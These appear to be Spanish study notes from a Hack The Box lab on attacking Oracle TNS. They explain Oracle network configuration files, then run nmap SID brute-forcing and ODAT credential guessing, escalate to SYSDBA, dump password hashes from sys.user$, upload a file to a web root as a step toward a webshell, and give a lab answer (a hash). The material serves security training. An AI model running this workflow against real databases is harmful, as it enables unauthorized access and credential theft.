El protocolo **Oracle Transparent Network Substrate** facilita la comunicación entre bases de datos Oracle y aplicaciones a través de redes. 

Se ha convertido en la solución preferida para la **gestión de bases de datos grandes** y complejas en los sectores de la salud, las finanzas y el comercio minorista.

Ha recibido actualizaciones para trabajar con certificados SSL/TLS e IPv6. Permite **cifrado entre cliente servidor**.

El **puerto predeterminado es el  TCP/1521**.



Los **archivos de configuración de ORACLE** se encuentran en el directorio *$ORACLE_HOME/network/admin*,   llamándose:
- tnsnames.ora
- listener.ora

## tnsnames.ora
Cada base de datos o servicio de Oracle dispone de una entrada única en el archivo **`tnsnames.ora`**, que contiene la información necesaria para que los clientes puedan establecer la conexión.  
Cada entrada especifica:
- **Nombre del servicio** (alias que usará el cliente para conectarse).
- **Ubicación de red** (protocolo, host y puerto).
- **Identificador de la base de datos** o **nombre del servicio** que el cliente debe solicitar.

Por ejemplo, un archivo `tnsnames.ora` sencillo podría verse así:

```tnsnames.ora
ORCL =
  (DESCRIPTION =
    (ADDRESS_LIST =
      (ADDRESS = (PROTOCOL = TCP)(HOST = 10.129.11.102)(PORT = 1521))
    )
    (CONNECT_DATA =
      (SERVER = DEDICATED)
      (SERVICE_NAME = orcl)
    )
  )
```

En este caso:
- El alias de conexión es **`ORCL`**.
- El servicio escucha en la **IP `10.129.11.102`**, **puerto TCP 1521**.
- Los clientes deben indicar el **`SERVICE_NAME`** `orcl` al conectarse.

Un archivo `tnsnames.ora` puede contener múltiples entradas similares para distintas bases de datos o servicios.

## listener.ora

El archivo **`listener.ora`** es un archivo de configuración **del lado del servidor** en Oracle.  
Define las propiedades y parámetros del **listener** (proceso de escucha), que se encarga de:

- **Aceptar** las solicitudes de conexión entrantes de los clientes.
- **Identificar** el servicio o instancia de destino.
- **Redirigir** la conexión hacia la base de datos correspondiente.


Un ejemplo de archivo `listener.ora` podría ser:
```listener.ora
SID_LIST_LISTENER =
  (SID_LIST =
    (SID_DESC =
      (SID_NAME = PDB1)
      (ORACLE_HOME = C:\oracle\product\19.0.0\dbhome_1)
      (GLOBAL_DBNAME = PDB1)
      (SID_DIRECTORY_LIST =
        (SID_DIRECTORY =
          (DIRECTORY_TYPE = TNS_ADMIN)
          (DIRECTORY = C:\oracle\product\19.0.0\dbhome_1\network\admin)
        )
      )
    )
  )

LISTENER =
  (DESCRIPTION_LIST =
    (DESCRIPTION =
      (ADDRESS = (PROTOCOL = TCP)(HOST = orcl.inlanefreight.htb)(PORT = 1521))
      (ADDRESS = (PROTOCOL = IPC)(KEY = EXTPROC1521))
    )
  )

ADR_BASE_LISTENER = C:\oracle
```

En este ejemplo:

- **`SID_LIST_LISTENER`**: Lista de descriptores de instancia (SID) que el listener puede gestionar.
    - `SID_NAME = PDB1`: Nombre de la base de datos o _pluggable database_.    
    - `ORACLE_HOME`: Ruta de instalación de Oracle.
    - `GLOBAL_DBNAME`: Nombre global de la base de datos que se anunciará a los clientes.
    - `SID_DIRECTORY_LIST`: Directorio que contiene la configuración de red (`TNS_ADMIN`).
        
- **`LISTENER`**: Configuración de direcciones donde el listener estará disponible.
    - Protocolo **TCP** en host `orcl.inlanefreight.htb` y puerto `1521`.
    - Protocolo **IPC** para comunicaciones locales (clave `EXTPROC1521`).
        
- **`ADR_BASE_LISTENER`**: Ruta base donde se almacenarán los registros y diagnósticos del listener.

Un `listener.ora` puede incluir múltiples **listeners** y **SIDs**, además de parámetros adicionales para:
- Configuración de seguridad (restricciones de IP, cifrado).
- Balanceo de carga y _failover_.
- Ajustes de trazas y depuración.

-----

En **Oracle**, los dos archivos clave de configuración de red cumplen funciones distintas:

- **`tnsnames.ora`** (lado del cliente):  
    Usado por _Oracle Net Services_ para **resolver nombres de servicio** en direcciones de red. Permite que el cliente traduzca un alias de servicio en la IP, puerto y parámetros de conexión necesarios.
- **`listener.ora`** (lado del servidor):  
    Usado por el **listener** para **definir los servicios que debe escuchar** y configurar el comportamiento de escucha (protocolos, puertos, instancias asociadas).
    

### Lista de Exclusión de PL/SQL (PlsqlExclusionList)

Oracle puede restringir la ejecución de determinados paquetes o tipos PL/SQL mediante una lista negra.
- **Ubicación**: `$ORACLE_HOME/sqldeveloper`
- **Formato**: Archivo de texto, creado por el usuario, que contiene los nombres de los paquetes o tipos PL/SQL prohibidos.
- **Funcionamiento**:
    - Una vez creado, se carga en la instancia de la base de datos.
    - Evita el acceso a estos elementos incluso a través de **Oracle Application Server**.
        
- **Objetivo**: Proteger la base de datos bloqueando ejecución de código PL/SQL no autorizado.

---

### Parámetros comunes en `tnsnames.ora` y conexiones Oracle

| **Parámetro**          | **Descripción**                                                 |
| ---------------------- | --------------------------------------------------------------- |
| **DESCRIPTION**        | Descriptor con nombre para la base de datos y tipo de conexión. |
| **ADDRESS**            | Dirección de red (host + puerto).                               |
| **PROTOCOL**           | Protocolo de red (TCP, IPC, etc.).                              |
| **PORT**               | Puerto de conexión.                                             |
| **CONNECT_DATA**       | Atributos de conexión (SERVICE_NAME, SID, INSTANCE_NAME).       |
| **INSTANCE_NAME**      | Nombre de la instancia de base de datos.                        |
| **SERVICE_NAME**       | Nombre del servicio al que se conecta el cliente.               |
| **SERVER**             | Tipo de servidor (DEDICATED o SHARED).                          |
| **USER**               | Usuario de base de datos.                                       |
| **PASSWORD**           | Contraseña del usuario.                                         |
| **SECURITY**           | Tipo de seguridad (ej. SSL/TLS).                                |
| **VALIDATE_CERT**      | Si se valida el certificado SSL/TLS.                            |
| **SSL_VERSION**        | Versión de SSL/TLS utilizada.                                   |
| **CONNECT_TIMEOUT**    | Tiempo máximo para establecer conexión.                         |
| **RECEIVE_TIMEOUT**    | Tiempo máximo para recibir respuesta.                           |
| **SEND_TIMEOUT**       | Tiempo máximo para enviar datos.                                |
| **SQLNET.EXPIRE_TIME** | Tiempo para detectar conexión caída.                            |
| **TRACE_LEVEL**        | Nivel de trazado de la conexión.                                |
| **TRACE_DIRECTORY**    | Directorio de los ficheros de trazas.                           |
| **TRACE_FILE_NAME**    | Nombre del archivo de trazas.                                   |
| **LOG_FILE**           | Archivo donde se guardan los logs.                              |

----
# Instalación de  odat.py -h
Oracle Database Attacking Tool ( `ODAT`) es una herramienta de pruebas de penetración de código abierto escrita en Python y diseñada para enumerar y explotar vulnerabilidades en bases de datos Oracle. Permite identificar y explotar diversas vulnerabilidades de seguridad en bases de datos Oracle, como la inyección SQL, la ejecución remota de código y la escalada de privilegios.

Antes de poder enumerar el oyente TNS e interactuar con él, necesitamos descargar algunos paquetes y herramientas para nuestra `Pwnbox`instancia, en caso de que aún no los tenga. Aquí hay un script de Bash que lo hace todo:

```
wget https://download.oracle.com/otn_software/linux/instantclient/214000/instantclient-basic-linux.x64-21.4.0.0.0dbru.zip
wget https://download.oracle.com/otn_software/linux/instantclient/214000/instantclient-sqlplus-linux.x64-21.4.0.0.0dbru.zip

sudo mkdir -p /opt/oracle
sudo unzip -d /opt/oracle instantclient-basic-linux.x64-21.4.0.0.0dbru.zip
sudo unzip -d /opt/oracle instantclient-sqlplus-linux.x64-21.4.0.0.0dbru.zip

export LD_LIBRARY_PATH=/opt/oracle/instantclient_21_4:$LD_LIBRARY_PATH
export PATH=$LD_LIBRARY_PATH:$PATH

source ~/.bashrc

cd ~
git clone https://github.com/quentinhardy/odat.git
cd odat/

pip install python-libnmap

git submodule init
git submodule update

pip3 install cx_Oracle

sudo apt-get install python3-scapy -y
sudo pip3 install colorlog termcolor passlib python-libnmap
sudo apt-get install build-essential libgmp-dev -y
pip3 install pycryptodome
```

Para comprobar que funciona, ejecutamos:

```shell-session
./odat.py -h
```

-----

# nmap

Hacemos un escaneo básico con nmap:
```shell-session
Polika4RM@htb[/htb]$ sudo nmap -p1521 -sV 10.129.204.235 --open
```

Para recibir feedback de que el puerto -p1521/tcp está abierto con Oracle TNS listener.

En oracle, un *SID* es un identificador único que identifica una instancia de una base de datos concreta. Una instancia es un conjunto de procesos y estrucutras que interactúan para gestionar los datos de la base de datos. 

El cliente, para referirse a una base de datos concreta tiene que facilitar ese SID.

Los SID son una parte esencial del proceso de conexión, ya que identifican la instancia específica de la base de datos a la que el cliente desea conectarse. Si el cliente especifica un SID incorrecto, el intento de conexión fallará. Los administradores de bases de datos pueden usar el SID para supervisar y gestionar las instancias individuales de una base de datos. Por ejemplo, pueden iniciar, detener o reiniciar una instancia, ajustar su asignación de memoria u otros parámetros de configuración, y supervisar su rendimiento mediante herramientas como Oracle Enterprise Manager.

Para **descubrir los SID**, se puede utilizar el siguiente comando.

```shell-session
Polika4RM@htb[/htb]$ sudo nmap -p1521 -sV 10.129.204.235 --open --script oracle-sid-brute
```

```shell-session
Polika4RM@htb[/htb]$ sudo nmap -p1521 -sV 10.129.204.235 --open --script oracle-sid-brute

Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-06 11:01 EST
Nmap scan report for 10.129.204.235
Host is up (0.0044s latency).

PORT     STATE SERVICE    VERSION
1521/tcp open  oracle-tns Oracle TNS listener 11.2.0.2.0 (unauthorized)
| oracle-sid-brute: 
|_  XE

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 55.40 seconds
```


---------------


Podemos utilizar la **ODAT.py** para enumerar y recopilar información sobre los servicios de la base de datos de Oracle. Podemos extraer de esta forma nombres de bases de datos, versiones, procesos en ejecución, cuentas de usuario, vulnerablilidades, configuraciones incorrectas, etc.


Con el parámetro *all* haremos un escaneo en profundidad con todos los módulos de odat.

```shell-session
Polika4RM@htb[/htb]$ ./odat.py all -s 10.129.204.235
```

```shell-session
Polika4RM@htb[/htb]$ ./odat.py all -s 10.129.204.235

[+] Checking if target 10.129.204.235:1521 is well configured for a connection...
[+] According to a test, the TNS listener 10.129.204.235:1521 is well configured. Continue...

...SNIP...

[!] Notice: 'mdsys' account is locked, so skipping this username for password           #####################| ETA:  00:01:16 
[!] Notice: 'oracle_ocm' account is locked, so skipping this username for password       #####################| ETA:  00:01:05 
[!] Notice: 'outln' account is locked, so skipping this username for password           #####################| ETA:  00:00:59
[+] Valid credentials found: scott/tiger. Continue...

...SNIP...
```

En este ejemplo, encontramos credenciales válidas para el usuario `scott`y su contraseña `tiger`. Después, podemos usar la herramienta `sqlplus`para conectarnos a la base de datos Oracle e interactuar con ella..

Una vez tengamos usuario y contraseñas encotntrados, usaremos: **SQLplus** para iniciar sesión.

## SQLplus

Ejecutaremos el comando:

```shell-session
Polika4RM@htb[/htb]$ sqlplus <usuario>/<contraseña>@1.2.3.4/<SIDs>
```
El SIDs se obtiene del escaneo con /odat.py:

```
[+] Accounts found on 10.129.79.120:1521/sid:XE: 
scott/tiger
 
```

Para iniciar sesión con credenciales obtenidas.


```shell-session
Polika4RM@htb[/htb]$ sqlplus scott/tiger@10.129.204.235/XE

SQL*Plus: Release 21.0.0.0.0 - Production on Mon Mar 6 11:19:21 2023
Version 21.4.0.0.0

Copyright (c) 1982, 2021, Oracle. All rights reserved.

ERROR:
ORA-28002: the password will expire within 7 days



Connected to:
Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production

SQL> 
```

Si aparece el error:
>sqlplus: error while loading shared libraries: libsqlplus.so: cannot open shared object file: No such file or directory

Deberemos ejecutar: 
```shell-session
Polika4RM@htb[/htb]$ sudo sh -c "echo /usr/lib/oracle/12.2/client64/lib > /etc/ld.so.conf.d/oracle-instantclient.conf";sudo ldconfig
```

## Comandos de  SQLplus
Una vez dentro de SQLplus, puedo ejecutar:
- SELECT table_name FROM all_tables;` → lista todas las tablas accesibles.
- SELECT * FROM user_role_privs;` → muestra los roles y privilegios del usuario actual.

Ejemplo:
```shell-session
SQL> select table_name from all_tables;

TABLE_NAME
------------------------------
DUAL
SYSTEM_PRIVILEGE_MAP
TABLE_PRIVILEGE_MAP
STMT_AUDIT_OPTION_MAP
AUDIT_ACTIONS
WRR$_REPLAY_CALL_FILTER
HS_BULKLOAD_VIEW_OBJ
HS$_PARALLEL_METADATA
HS_PARTITION_COL_NAME
HS_PARTITION_COL_TYPE
HELP

...SNIP...


SQL> select * from user_role_privs;

USERNAME                       GRANTED_ROLE                   ADM DEF OS_
------------------------------ ------------------------------ --- --- ---
SCOTT                          CONNECT                        NO  YES NO
SCOTT                          RESOURCE                       NO  YES NO
```

En este caso, el usuario `scott`no tiene privilegios administrativos. 

Sin embargo, podemos intentar usar esta cuenta para iniciar sesión como administrador de la base de datos del sistema ( `sysdba`), lo que nos otorga mayores privilegios. Esto es posible cuando el usuario `scott`cuenta con los privilegios adecuados, generalmente otorgados por el administrador de la base de datos o utilizados por él mismo.

En Oracle, **privilegios administrativos** y **SYSDBA** no son exactamente lo mismo, aunque puedan parecerlo.

**1. Privilegios administrativos (en general)**
- Son permisos elevados asignados a un usuario mediante roles o privilegios de sistema, como por ejemplo:
    - `DBA` → acceso a todos los objetos de la base de datos, crear/alterar usuarios, gestionar espacio, etc.
    - `CREATE USER`, `DROP USER`, `GRANT`, `REVOKE`, etc.
- Se gestionan desde dentro de la base de datos y **dependen de que puedas iniciar sesión normalmente como ese usuario**
- No dan acceso a funciones internas de arranque/parada de la base de datos ni a datos sin abrir la instancia.

**2. SYSDBA**
- Es un **privilegio especial de conexión** (no un rol normal).
- Otorga control absoluto sobre la base de datos, **incluso si está parada**.
- Permite:
    - Arrancar y apagar la base de datos (`STARTUP`, `SHUTDOWN`).    
    - Conectarse como usuario `SYS` sin conocer su contraseña real.    
    - Acceder a todos los objetos y datos, ignorando permisos normales.    
    - Realizar operaciones de recuperación, restauración y exportación total.    
- Se configura en el **fichero `oracle password file`** (`orapwd`) o en el archivo `OS authentication` (como `dba` en el SO).
- Está **por encima** del rol `DBA`.


En el ejemplo:
```shell-session
Polika4RM@htb[/htb]$ sqlplus scott/tiger@10.129.204.235/XE as sysdba

SQL*Plus: Release 21.0.0.0.0 - Production on Mon Mar 6 11:32:58 2023
Version 21.4.0.0.0

Copyright (c) 1982, 2021, Oracle. All rights reserved.


Connected to:
Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production


SQL> select * from user_role_privs;

USERNAME                       GRANTED_ROLE                   ADM DEF OS_
------------------------------ ------------------------------ --- --- ---
SYS                            ADM_PARALLEL_EXECUTE_TASK      YES YES NO
SYS                            APEX_ADMINISTRATOR_ROLE        YES YES NO
SYS                            AQ_ADMINISTRATOR_ROLE          YES YES NO
SYS                            AQ_USER_ROLE                   YES YES NO
SYS                            AUTHENTICATEDUSER              YES YES NO
SYS                            CONNECT                        YES YES NO
SYS                            CTXAPP                         YES YES NO
SYS                            DATAPUMP_EXP_FULL_DATABASE     YES YES NO
SYS                            DATAPUMP_IMP_FULL_DATABASE     YES YES NO
SYS                            DBA                            YES YES NO
SYS                            DBFS_ROLE                      YES YES NO

USERNAME                       GRANTED_ROLE                   ADM DEF OS_
------------------------------ ------------------------------ --- --- ---
SYS                            DELETE_CATALOG_ROLE            YES YES NO
SYS                            EXECUTE_CATALOG_ROLE           YES YES NO
```

Lo que está pasando es que, aunque te conectas usando el usuario **`scott`**, al añadir `as sysdba` en realidad entras como el usuario interno **`SYS`**.

Ese privilegio `SYSDBA` te da acceso al **superusuario de Oracle**, que tiene roles como:
- `DBA` (administración completa de la base de datos)
- `DATAPUMP_EXP_FULL_DATABASE` y `DATAPUMP_IMP_FULL_DATABASE` (exportar e importar todo)
- `AQ_ADMINISTRATOR_ROLE` (gestión de colas avanzadas)
- `APEX_ADMINISTRATOR_ROLE` (administración de Oracle APEX)
- Otros roles de mantenimiento y ejecución de tareas críticas.
    
**No siempre el usuario podrá hacer un "as sysdba", depende de si existe una mala configuración por parte del administrador.

En resumen:
- Si `scott` se conectara normalmente (`sqlplus scott/tiger@...`), solo tendría los roles _CONNECT_ y _RESOURCE_.
- Con `as sysdba`, Oracle ignora esos privilegios y **te eleva directamente a SYS**, que tiene acceso absoluto.

Una vez que accedemos a una base de datos Oracle, podemos seguir diversos enfoques. Esto depende en gran medida de la información disponible y de la configuración completa. Sin embargo, no podemos agregar nuevos usuarios ni realizar modificaciones. 

### ESTRATEGIA 1: Recuperación de hashes de contraseñas $sys.user 
A partir de este punto, podríamos recuperar los hashes de contraseñas `sys.user$`e intentar descifrarlos sin conexión. La consulta para esto sería similar a la siguiente:

```shell-session
SQL> select name, password from sys.user$;
```

```shell-session
SQL> select name, password from sys.user$;

NAME                           PASSWORD
------------------------------ ------------------------------
SYS                            FBA343E7D6C8BC9D
PUBLIC
CONNECT
RESOURCE
DBA
SYSTEM                         B5073FE1DE351687
SELECT_CATALOG_ROLE
EXECUTE_CATALOG_ROLE
DELETE_CATALOG_ROLE
OUTLN                          4A3BA55E08595C81
EXP_FULL_DATABASE

NAME                           PASSWORD
------------------------------ ------------------------------
IMP_FULL_DATABASE
LOGSTDBY_ADMINISTRATOR
...SNIP...
```

### ESTRATEGIA 2: Cargar webshell
Otra opción es cargar un shell web al destino. Sin embargo, esto requiere que el servidor ejecute un servidor web y necesitamos conocer la ubicación exacta del directorio raíz del servidor web. No obstante, si conocemos el tipo de sistema con el que trabajamos, podemos probar las rutas predeterminadas, que son:

| OS       | Ruta                 |
| -------- | -------------------- |
| Linux    | `/var/www/html`      |
| Ventanas | `C:\inetpub\wwwroot` |
En primer lugar, siempre es importante probar nuestro enfoque de explotación con archivos que no parezcan peligrosos para los sistemas antivirus o de detección/prevención de intrusiones. Por lo tanto, creamos un archivo de texto con una cadena y lo usamos para subirlo al sistema objetivo.

#### Oracle RDBMS - Carga de archivos

```shell-session
[!bash!]$ echo "Oracle File Upload Test" > testing.txt
[!bash!]$ ./odat.py utlfile -s 10.129.204.235 -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt

[1] (10.129.204.235:1521): Put the ./testing.txt local file in the C:\inetpub\wwwroot folder like testing.txt on the 10.129.204.235 server                                                                                                  
[+] The ./testing.txt file was created on the C:\inetpub\wwwroot directory on the 10.129.204.235 server like the testing.txt file
```

Finalmente, podemos probar si la subida de archivos funcionó correctamente con un`curl`. Por lo tanto, usaremos una `GET http://<IP>/archivo.txt`solicitud o podremos acceder a través del navegador.

```shell-session
[!bash!]$ curl -X GET http://10.129.204.235/testing.txt

Oracle File Upload Test
```

------

**\[+1 CUBE ] Enumerate the target Oracle database and submit the password hash of the user DBSNMP as the answer.

En primer lugar, realizamos un:
```
sudo nmap -p1521 -sV 1.2.3.4 --open --script oracle-sid-brute
```
Para descubrir SID existentes de la base de datos de Oracle.
Observamos que detecta un SID llamado *"XE"*

Acto seguido, lanzamos odat.py para intentar numerar credenciales. Lo haremos con el comando:
```
./odat.py all -s 10.129.205.19

```
 Y observo las siguientes credenciales asociadas a tal SID:
```
[+] Accounts found on 10.129.205.19:1521/sid:XE: 
scott/tiger
```

Me conecto a la base de datos de oracle con dichas credenciales:
```
sqlplus \ scott/tiger@10.129.205.19\/XE as sysdba
```

Y ejecuto un:
```
select table_name from all_tables;
```

Y veo, entre otros:

```
NAME			       PASSWORD
------------------------------ ------------------------------
ORACLE_OCM		       5A2E026A9157958C
RECOVERY_CATALOG_OWNER
SCHEDULER_ADMIN
HS_ADMIN_SELECT_ROLE
HS_ADMIN_EXECUTE_ROLE
HS_ADMIN_ROLE
OEM_ADVISOR
OEM_MONITOR
DBSNMP			       E066D214D5421CCC
APPQOSSYS		       519D632B7EE7F63A
PLUSTRACE

```

```
DBSNMP			       E066D214D5421CCC
```

Respuesta: ***"E066D214D5421CCC"***

